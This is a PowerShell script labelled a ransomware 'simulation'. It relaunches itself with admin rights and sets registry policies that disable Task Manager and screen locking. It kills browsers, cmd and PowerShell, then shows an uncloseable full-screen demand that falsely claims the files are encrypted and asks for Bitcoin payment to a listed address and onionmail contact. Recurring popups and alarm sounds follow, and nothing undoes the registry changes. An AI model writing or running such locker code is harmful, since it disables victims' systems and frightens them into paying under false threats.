# Ransomware Simulation - Educational Use Only
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ADMIN CHECK AND ELEVATION
# Check if running as administrator, restart as admin if not
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Elevating to Administrator privileges..." -ForegroundColor Yellow
    Start-Sleep -Seconds 1
    
    # More reliable way to get script path
    $scriptPath = $PSCommandPath
    if (-not $scriptPath) {
        # Try alternative method
        $scriptPath = $MyInvocation.MyCommand.Definition
    }
    
    if (-not $scriptPath) {
        # If still not found, use the current script's full path
        $scriptPath = [System.IO.Path]::GetFullPath(".\$($MyInvocation.MyCommand.Name)")
    }
    
    # Create a temporary script with the current content
    $tempScript = Join-Path $env:TEMP "ransom_sim_$(Get-Random).ps1"
    $currentScriptContent = Get-Content -Path $PSCommandPath -Raw -ErrorAction SilentlyContinue
    if (-not $currentScriptContent) {
        # If we can't read the current file, recreate it from here
        $currentScriptContent = @'
# Rest of the script content will be embedded here
'@
    }
    
    # Write current script to temp file
    Set-Content -Path $tempScript -Value $currentScriptContent -Encoding UTF8
    
    # Restart with elevated privileges
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$tempScript`"" -Verb RunAs
    
    # Exit the non-elevated instance
    exit
}

# System lockdown sequence
function Invoke-SystemLockdown {
    # Disable critical system tools
    try {
        # Run these with explicit admin rights
        Start-Process reg.exe -ArgumentList "add `"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System`" /v DisableTaskMgr /t REG_DWORD /d 1 /f" -WindowStyle Hidden -Wait
        Start-Process reg.exe -ArgumentList "add `"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System`" /v DisableLockWorkstation /t REG_DWORD /d 1 /f" -WindowStyle Hidden -Wait
        Start-Process reg.exe -ArgumentList "add `"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`" /v NoClose /t REG_DWORD /d 1 /f" -WindowStyle Hidden -Wait
        
        # Also set system-wide policies
        Start-Process reg.exe -ArgumentList "add `"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System`" /v DisableTaskMgr /t REG_DWORD /d 1 /f" -WindowStyle Hidden -Wait
        Start-Process reg.exe -ArgumentList "add `"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System`" /v DisableLockWorkstation /t REG_DWORD /d 1 /f" -WindowStyle Hidden -Wait
    } catch {}
    
    # Kill security processes with elevated privileges
    Get-Process taskmgr, msedge, chrome, firefox, cmd, powershell, powershell_ise -ErrorAction SilentlyContinue | Stop-Process -Force
}

# System information display
function Show-SystemInfo {
    $infoWindow = New-Object System.Windows.Window
    $infoWindow.Title = "SYSTEM ANALYSIS - ENCRYPTION PROGRESS"
    $infoWindow.Width = 500
    $infoWindow.Height = 400
    $infoWindow.Topmost = $true
    $infoWindow.WindowStyle = 'None'
    $infoWindow.ShowInTaskbar = $false
    $infoWindow.ResizeMode = 'NoResize'
    $infoWindow.AllowsTransparency = $false
    $infoWindow.Focusable = $false
    
    $infoGrid = New-Object System.Windows.Controls.Grid
    $infoGrid.Background = '#002200'
    
    $infoText = New-Object System.Windows.Controls.TextBlock
    $infoText.Text = "SYSTEM ANALYSIS REPORT`n`n" +
                    "Computer Name: $env:COMPUTERNAME`n" +
                    "User: $env:USERNAME`n" +
                    "Files Encrypted: 2,847`n" +
                    "Total Data: 145.7 GB`n" +
                    "Encryption: RSA-2048 + AES-256`n" +
                    "Status: COMPLETE`n`n" +
                    "Bitcoin Payment Required`n" +
                    "Address: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh`n`n" +
                    "Time Remaining: 23:59:59"
    $infoText.Foreground = 'Lime'
    $infoText.FontFamily = 'Courier New'
    $infoText.FontSize = 12
    $infoText.HorizontalAlignment = 'Center'
    $infoText.VerticalAlignment = 'Center'
    $infoText.TextWrapping = 'Wrap'
    
    $infoGrid.Children.Add($infoText)
    $infoWindow.Content = $infoGrid
    
    # Position in bottom-right corner
    $infoWindow.Left = [System.Windows.SystemParameters]::PrimaryScreenWidth - 550
    $infoWindow.Top = [System.Windows.SystemParameters]::PrimaryScreenHeight - 450
    
    # Enhanced closing prevention
    $infoWindow.Add_Closing({
        $_.Cancel = $true
        # Force window to stay on top
        $this.Topmost = $false
        $this.Topmost = $true
        $this.Activate()
    })
    
    $infoWindow.Add_KeyDown({
        # Block all system key combinations
        if ($_.Key -eq 'F4' -and [System.Windows.Input.Keyboard]::IsKeyDown('LeftAlt')) {
            $_.Handled = $true
        }
        if ($_.Key -eq 'Escape') {
            $_.Handled = $true
        }
    })
    
    $infoWindow.Show()
    return $infoWindow
}

# Main ransom window
function Show-MainRansomWindow {
    $mainWindow = New-Object System.Windows.Window
    $mainWindow.WindowState = 'Maximized'
    $mainWindow.WindowStyle = 'None'
    $mainWindow.Topmost = $true
    $mainWindow.Background = 'Black'
    $mainWindow.ShowInTaskbar = $false
    $mainWindow.ResizeMode = 'NoResize'
    $mainWindow.AllowsTransparency = $false
    $mainWindow.Focusable = $false
    
    $grid = New-Object System.Windows.Controls.Grid
    $mainWindow.Content = $grid
    
    # Red warning border
    $border = New-Object System.Windows.Controls.Border
    $border.BorderBrush = 'Red'
    $border.BorderThickness = '10'
    $border.Background = 'Black'
    $grid.Children.Add($border)
    
    # Main title
    $title = New-Object System.Windows.Controls.TextBlock
    $title.Text = "!!! CRITICAL SYSTEM ALERT !!!"
    $title.Foreground = 'Red'
    $title.FontSize = 48
    $title.FontWeight = 'Bold'
    $title.HorizontalAlignment = 'Center'
    $title.VerticalAlignment = 'Top'
    $title.Margin = '0,50,0,0'
    $grid.Children.Add($title)
    
    # Main ransom message
    $message = New-Object System.Windows.Controls.TextBlock
    $message.Text = "YOUR FILES HAVE BEEN ENCRYPTED`n`n" +
                   "All your personal files, documents, photos, videos, databases,`n" +
                   "and other important data have been encrypted with military-grade`n" +
                   "RSA-2048 and AES-256 encryption algorithms.`n`n" +
                   "Payment Required: $500 Bitcoin`n" +
                   "Bitcoin Address: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh`n`n" +
                   "Time Remaining: 23:59:59`n`n" +
                   "WARNING - CRITICAL NOTICES:`n" +
                   "• SYSTEM SHUTDOWN/RESTART = PERMANENT DATA DELETION`n" +
                   "• TASK MANAGER & SYSTEM TOOLS DISABLED`n" +
                   "• RECOVERY ATTEMPTS WILL CORRUPT REMAINING FILES`n" +
                   "• NETWORK DISCONNECTION = DECRYPTION KEY DELETION`n" +
                   "• ANTIVIRUS USE = ACCELERATED FILE CORRUPTION`n`n" +
                   "Contact: emergency_recovery@onionmail.org`n" +
                   "(Tor Browser Required - Normal browsers blocked)"
    $message.Foreground = 'Red'
    $message.FontSize = 18
    $message.FontWeight = 'Bold'
    $message.HorizontalAlignment = 'Center'
    $message.VerticalAlignment = 'Center'
    $message.TextWrapping = 'Wrap'
    $message.Margin = '100,150,100,100'
    $grid.Children.Add($message)
    
    # Enhanced closing prevention
    $mainWindow.Add_Closing({
        $_.Cancel = $true
        # Force window to stay on top
        $this.Topmost = $false
        $this.Topmost = $true
        $this.Activate()
    })
    
    $mainWindow.Add_KeyDown({
        # Block all system key combinations
        if ($_.Key -eq 'F4' -and [System.Windows.Input.Keyboard]::IsKeyDown('LeftAlt')) {
            $_.Handled = $true
        }
        if ($_.Key -eq 'Escape') {
            $_.Handled = $true
        }
    })
    
    return @{
        Window = $mainWindow
    }
}

# Audio warning system
function Start-AudioWarning {
    $audioTimer = New-Object System.Windows.Forms.Timer
    $audioTimer.Interval = 60000  # Every minute
    $audioTimer.Add_Tick({
        [System.Media.SystemSounds]::Hand.Play()
    })
    $audioTimer.Start()
    return $audioTimer
}

# Popup reminder system
function Start-PopupReminders {
    $popupTimer = New-Object System.Windows.Forms.Timer
    $popupTimer.Interval = 45000  # Every 45 seconds
    $popupCount = 0
    $popupTimer.Add_Tick({
        $popupCount++
        $message = @"
YOUR FILES ARE ENCRYPTED!

Payment Required: $500 Bitcoin
Address: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

Time Remaining: 24 HOURS

WARNING: System shutdown = PERMANENT data loss!
Popup: $popupCount
"@
        [System.Windows.Forms.MessageBox]::Show($message, "RANSOMWARE ALERT - DO NOT IGNORE", "OK", "Error")
    })
    $popupTimer.Start()
    return $popupTimer
}

# Execute the full simulation
Invoke-SystemLockdown

$audioTimer = Start-AudioWarning
$popupTimer = Start-PopupReminders
$mainRansom = Show-MainRansomWindow
$systemInfoWindow = Show-SystemInfo

$mainRansom.Window.ShowDialog()

# Cleanup when window eventually closes
$systemInfoWindow.Close()
$audioTimer.Stop()
$popupTimer.Stop()
